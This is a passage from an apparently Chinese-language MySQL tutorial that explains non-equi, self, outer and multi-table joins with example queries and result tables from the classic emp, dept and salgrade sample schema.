<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">举例：</span><br><span class="line"><span class="keyword">select</span> a.ename,b.dname <span class="keyword">from</span> emp a <span class="keyword">join</span> dept b <span class="keyword">on</span> a.deptno<span class="operator">=</span>b.deptno;</span><br></pre></td></tr></table></figure>
<h3 id="非等值连接"><a href="#非等值连接" class="headerlink" title="非等值连接"></a>非等值连接</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">特点：条件是非等量关系</span><br><span class="line"></span><br><span class="line">语法：</span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span>  <span class="operator">/</span><span class="operator">/</span><span class="keyword">inner</span> 可省略</span><br><span class="line"></span><br><span class="line">on...between...and...</span><br><span class="line"></span><br><span class="line"><span class="keyword">where</span></span><br></pre></td></tr></table></figure>
<p>示例：找出每位员工对应的工资以及相应的工资等级</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">select</span> a.ename,a.sal,c.grade <span class="keyword">from</span> emp a <span class="keyword">join</span> salgrade c <span class="keyword">on</span> a.sal <span class="operator">&gt;=</span> c.losal <span class="keyword">and</span> a.sal <span class="operator">&lt;=</span> c.hisal;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">select</span> a.ename,a.sal,c.grade <span class="keyword">from</span> emp a <span class="keyword">join</span> salgrade c <span class="keyword">on</span> a.sal <span class="keyword">between</span> c.losal <span class="keyword">and</span>  c.hisal;</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> a.ename,a.sal,c.grade <span class="keyword">from</span> emp a <span class="keyword">join</span> salgrade c <span class="keyword">on</span> a.sal <span class="operator">&gt;=</span> c.losal <span class="keyword">and</span> a.sal <span class="operator">&lt;=</span> c.hisal;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> ename  <span class="operator">|</span> sal     <span class="operator">|</span> grade <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> SMITH  <span class="operator">|</span>  <span class="number">800.00</span> <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN  <span class="operator">|</span> <span class="number">1600.00</span> <span class="operator">|</span>     <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD   <span class="operator">|</span> <span class="number">1250.00</span> <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES  <span class="operator">|</span> <span class="number">2975.00</span> <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN <span class="operator">|</span> <span class="number">1250.00</span> <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE  <span class="operator">|</span> <span class="number">2850.00</span> <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CLARK  <span class="operator">|</span> <span class="number">2450.00</span> <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT  <span class="operator">|</span> <span class="number">3000.00</span> <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING   <span class="operator">|</span> <span class="number">5000.00</span> <span class="operator">|</span>     <span class="number">5</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER <span class="operator">|</span> <span class="number">1500.00</span> <span class="operator">|</span>     <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS  <span class="operator">|</span> <span class="number">1100.00</span> <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES  <span class="operator">|</span>  <span class="number">950.00</span> <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD   <span class="operator">|</span> <span class="number">3000.00</span> <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER <span class="operator">|</span> <span class="number">1300.00</span> <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------+-------+</span></span><br><span class="line"><span class="number">14</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<h3 id="自连接"><a href="#自连接" class="headerlink" title="自连接"></a>自连接</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">特点：一张表看作两张表，自己连接自己</span><br></pre></td></tr></table></figure>
<p>示例：找出每位员工对应的上级领导名称</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">员工编号，员工名，上级领导编号：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> empno,ename,mgr <span class="keyword">from</span> emp;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+------+</span></span><br><span class="line"><span class="operator">|</span> empno <span class="operator">|</span> ename  <span class="operator">|</span> mgr  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7369</span> <span class="operator">|</span> SMITH  <span class="operator">|</span> <span class="number">7902</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7499</span> <span class="operator">|</span> ALLEN  <span class="operator">|</span> <span class="number">7698</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7521</span> <span class="operator">|</span> WARD   <span class="operator">|</span> <span class="number">7698</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7566</span> <span class="operator">|</span> JONES  <span class="operator">|</span> <span class="number">7839</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7654</span> <span class="operator">|</span> MARTIN <span class="operator">|</span> <span class="number">7698</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7698</span> <span class="operator">|</span> BLAKE  <span class="operator">|</span> <span class="number">7839</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7782</span> <span class="operator">|</span> CLARK  <span class="operator">|</span> <span class="number">7839</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7788</span> <span class="operator">|</span> SCOTT  <span class="operator">|</span> <span class="number">7566</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7839</span> <span class="operator">|</span> KING   <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7844</span> <span class="operator">|</span> TURNER <span class="operator">|</span> <span class="number">7698</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7876</span> <span class="operator">|</span> ADAMS  <span class="operator">|</span> <span class="number">7788</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7900</span> <span class="operator">|</span> JAMES  <span class="operator">|</span> <span class="number">7698</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7902</span> <span class="operator">|</span> FORD   <span class="operator">|</span> <span class="number">7566</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7934</span> <span class="operator">|</span> MILLER <span class="operator">|</span> <span class="number">7782</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+------+</span></span><br><span class="line"><span class="number">14</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">将该表看作两张表：</span><br><span class="line"></span><br><span class="line">员工表：emp a</span><br><span class="line"><span class="operator">|</span> (员工名)<span class="operator">|</span>(对应上级领导编号)<span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------+</span></span><br><span class="line"><span class="operator">|</span> ename  <span class="operator">|</span> mgr  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------+</span></span><br><span class="line"><span class="operator">|</span> SMITH  <span class="operator">|</span> <span class="number">7902</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN  <span class="operator">|</span> <span class="number">7698</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD   <span class="operator">|</span> <span class="number">7698</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES  <span class="operator">|</span> <span class="number">7839</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN <span class="operator">|</span> <span class="number">7698</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE  <span class="operator">|</span> <span class="number">7839</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CLARK  <span class="operator">|</span> <span class="number">7839</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT  <span class="operator">|</span> <span class="number">7566</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING   <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER <span class="operator">|</span> <span class="number">7698</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS  <span class="operator">|</span> <span class="number">7788</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES  <span class="operator">|</span> <span class="number">7698</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD   <span class="operator">|</span> <span class="number">7566</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER <span class="operator">|</span> <span class="number">7782</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------+</span></span><br><span class="line"></span><br><span class="line">领导表：emp b</span><br><span class="line"><span class="operator">|</span>(领导编号)<span class="operator">|</span>(领导名)<span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> empno <span class="operator">|</span> ename  <span class="operator">|</span> </span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7902</span> <span class="operator">|</span> FORD   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7698</span> <span class="operator">|</span> BLAKE  <span class="operator">|</span> </span><br><span class="line"><span class="operator">|</span>  <span class="number">7839</span> <span class="operator">|</span> KING   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7566</span> <span class="operator">|</span> JONES  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7788</span> <span class="operator">|</span> SCOTT  <span class="operator">|</span> </span><br><span class="line"><span class="operator">|</span>  <span class="number">7782</span> <span class="operator">|</span> CLARK  <span class="operator">|</span> </span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">自连接查询：条件：员工表中员工的上级领导编号等于领导表中领导的领导编号</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> a.ename <span class="keyword">as</span> <span class="string">&#x27;员工名&#x27;</span>,b.ename <span class="keyword">as</span> <span class="string">&#x27;领导名&#x27;</span> <span class="keyword">from</span> emp a <span class="keyword">join</span> emp b <span class="keyword">on</span> a.mgr<span class="operator">=</span>b.empno;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+-----------+</span></span><br><span class="line"><span class="operator">|</span>   员工名   <span class="operator">|</span>   领导名   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+-----------+</span></span><br><span class="line"><span class="operator">|</span> SMITH     <span class="operator">|</span> FORD      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN     <span class="operator">|</span> BLAKE     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD      <span class="operator">|</span> BLAKE     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES     <span class="operator">|</span> KING      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN    <span class="operator">|</span> BLAKE     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE     <span class="operator">|</span> KING      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CLARK     <span class="operator">|</span> KING      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT     <span class="operator">|</span> JONES     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER    <span class="operator">|</span> BLAKE     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS     <span class="operator">|</span> SCOTT     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES     <span class="operator">|</span> BLAKE     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD      <span class="operator">|</span> JONES     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER    <span class="operator">|</span> CLARK     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+-----------+</span></span><br><span class="line"><span class="number">13</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<h1 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h1><blockquote>
<p><strong>外连接：A表与B表进行连接，AB两张表中一张为主表，一张为副表，主要查询的是主表中的数据，当副表中的数据不能与主表中的数据匹配时，副表会自动模拟出 NULL 与之匹配。<br>内连接：A表与B表进行连接，将两张表中能够匹配的数据查出来，不能匹配的数据忽略不计。AB两张表没有主次之分，是平等的。</strong></p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">特点：查询占主导地位的表，捎带着查询副表中的数据，当副表中数据与之不匹配时，自动以 <span class="keyword">NULL</span> 替换，不会丢失主表中的数据。</span><br><span class="line"></span><br><span class="line">语法：</span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">left</span><span class="operator">/</span><span class="keyword">right</span> <span class="keyword">outer</span> <span class="keyword">join</span> <span class="operator">/</span><span class="operator">/</span><span class="keyword">outer</span> 可省略</span><br><span class="line"></span><br><span class="line"><span class="keyword">on</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">where</span> </span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">注：</span><br><span class="line"><span class="keyword">left</span>表示左连接，即左边占主导地位</span><br><span class="line"><span class="keyword">right</span>表示右连接，即右边占指导地位</span><br></pre></td></tr></table></figure>
<p>示例：找出哪一个部门没有员工</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span>   <span class="keyword">select</span> dname,ename <span class="keyword">from</span> dept a <span class="keyword">left</span> <span class="keyword">join</span> emp b <span class="keyword">on</span> a.deptno<span class="operator">=</span>b.deptno;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+--------+</span></span><br><span class="line"><span class="operator">|</span> dname      <span class="operator">|</span> ename  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+--------+</span></span><br><span class="line"><span class="operator">|</span> RESEARCH   <span class="operator">|</span> SMITH  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SALES      <span class="operator">|</span> ALLEN  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SALES      <span class="operator">|</span> WARD   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> RESEARCH   <span class="operator">|</span> JONES  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SALES      <span class="operator">|</span> MARTIN <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SALES      <span class="operator">|</span> BLAKE  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ACCOUNTING <span class="operator">|</span> CLARK  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> RESEARCH   <span class="operator">|</span> SCOTT  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ACCOUNTING <span class="operator">|</span> KING   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SALES      <span class="operator">|</span> TURNER <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> RESEARCH   <span class="operator">|</span> ADAMS  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SALES      <span class="operator">|</span> JAMES  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> RESEARCH   <span class="operator">|</span> FORD   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ACCOUNTING <span class="operator">|</span> MILLER <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> OPERATIONS <span class="operator">|</span> <span class="keyword">NULL</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+--------+</span></span><br><span class="line"><span class="number">15</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span>   <span class="keyword">select</span> dname,ename <span class="keyword">from</span> dept a <span class="keyword">left</span> <span class="keyword">join</span> emp b <span class="keyword">on</span> a.deptno<span class="operator">=</span>b.deptno <span class="keyword">where</span> b.ename <span class="keyword">is</span> <span class="keyword">NULL</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+-------+</span></span><br><span class="line"><span class="operator">|</span> dname      <span class="operator">|</span> ename <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+-------+</span></span><br><span class="line"><span class="operator">|</span> OPERATIONS <span class="operator">|</span> <span class="keyword">NULL</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+-------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<h1 id="多表查询-1"><a href="#多表查询-1" class="headerlink" title="多表查询"></a>多表查询</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span></span><br><span class="line"></span><br><span class="line">join...on...join...on...join...on... </span><br><span class="line"></span><br><span class="line"><span class="keyword">where</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">举例理解：</span><br><span class="line"><span class="keyword">select</span> a.ename,b.dname,c.grade <span class="keyword">from</span> emp a <span class="keyword">left</span> <span class="keyword">join</span> dept b <span class="keyword">on</span> a.deptno<span class="operator">=</span>b.deptno <span class="keyword">join</span> salgrade c <span class="keyword">on</span> a.sal <span class="keyword">between</span> c.losal <span class="keyword">and</span> c.hisal;</span><br><span class="line">解释：emp a 先与 dept b 进行外连接查询，查询出之后的表再与 salgrade c 进行内连接查询。</span><br><span class="line"></span><br><span class="line">注：</span><br><span class="line">什么时候需要外连接查询，什么时候不需要，并且注意哪一张表作为主表，哪张表是副表，使用左连接与右连接要灵活。</span><br></pre></td></tr></table></figure>
<p>示例一：找出每位员工的部门名称和工资等级</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">员工部门编号，员工名称，月薪：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> empno,ename,sal <span class="keyword">from</span> emp;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+---------+</span></span><br><span class="line"><span class="operator">|</span> empno <span class="operator">|</span> ename  <span class="operator">|</span> sal     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+---------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7369</span> <span class="operator">|</span> SMITH  <span class="operator">|</span>  <span class="number">800.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7499</span> <span class="operator">|</span> ALLEN  <span class="operator">|</span> <span class="number">1600.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7521</span> <span class="operator">|</span> WARD   <span class="operator">|</span> <span class="number">1250.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7566</span> <span class="operator">|</span> JONES  <span class="operator">|</span> <span class="number">2975.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7654</span> <span class="operator">|</span> MARTIN <span class="operator">|</span> <span class="number">1250.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7698</span> <span class="operator">|</span> BLAKE  <span class="operator">|</span> <span class="number">2850.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7782</span> <span class="operator">|</span> CLARK  <span class="operator">|</span> <span class="number">2450.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7788</span> <span class="operator">|</span> SCOTT  <span class="operator">|</span> <span class="number">3000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7839</span> <span class="operator">|</span> KING   <span class="operator">|</span> <span class="number">5000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7844</span> <span class="operator">|</span> TURNER <span class="operator">|</span> <span class="number">1500.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7876</span> <span class="operator">|</span> ADAMS  <span class="operator">|</span> <span class="number">1100.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7900</span> <span class="operator">|</span> JAMES  <span class="operator">|</span>  <span class="number">950.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7902</span> <span class="operator">|</span> FORD   <span class="operator">|</span> <span class="number">3000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7934</span> <span class="operator">|</span> MILLER <span class="operator">|</span> <span class="number">1300.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+---------+</span></span><br><span class="line"><span class="number">14</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">部门编号，部门名称：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> deptno,dname <span class="keyword">from</span> dept;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="operator">|</span> deptno <span class="operator">|</span> dname      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="operator">|</span>     <span class="number">10</span> <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>     <span class="number">40</span> <span class="operator">|</span> OPERATIONS <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> a.ename,b.dname <span class="keyword">from</span> emp a <span class="keyword">left</span> <span class="keyword">join</span> dept b <span class="keyword">on</span> a.deptno<span class="operator">=</span>b.deptno;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="operator">|</span> ename  <span class="operator">|</span> dname      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="operator">|</span> CLARK  <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING   <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SMITH  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD   <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN  <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD   <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE  <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES  <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="number">14</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> a.ename,b.dname,c.grade <span class="keyword">from</span> emp a <span class="keyword">left</span> <span class="keyword">join</span> dept b <span class="keyword">on</span> a.deptno<span class="operator">=</span>b.deptno <span class="keyword">join</span> salgrade c <span class="keyword">on</span> a.sal <span class="keyword">between</span> c.losal <span class="keyword">and</span> c.hisal;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+-------+</span></span><br><span class="line"><span class="operator">|</span> ename  <span class="operator">|</span> dname      <span class="operator">|</span> grade <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+-------+</span></span><br><span class="line"><span class="operator">|</span> SMITH  <span class="operator">|</span> RESEARCH   <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN  <span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD   <span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES  <span class="operator">|</span> RESEARCH   <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN <span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE  <span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CLARK  <span class="operator">|</span> ACCOUNTING <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT  <span class="operator">|</span> RESEARCH   <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING   <span class="operator">|</span> ACCOUNTING <span class="operator">|</span>     <span class="number">5</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER <span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS  <span class="operator">|</span> RESEARCH   <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES  <span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD   <span class="operator">|</span> RESEARCH   <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER <span class="operator">|</span> ACCOUNTING <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+-------+</span></span><br><span class="line"><span class="number">14</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<p>示例二：出每位员工的部门名称，工资等级，以及上级领导</p>
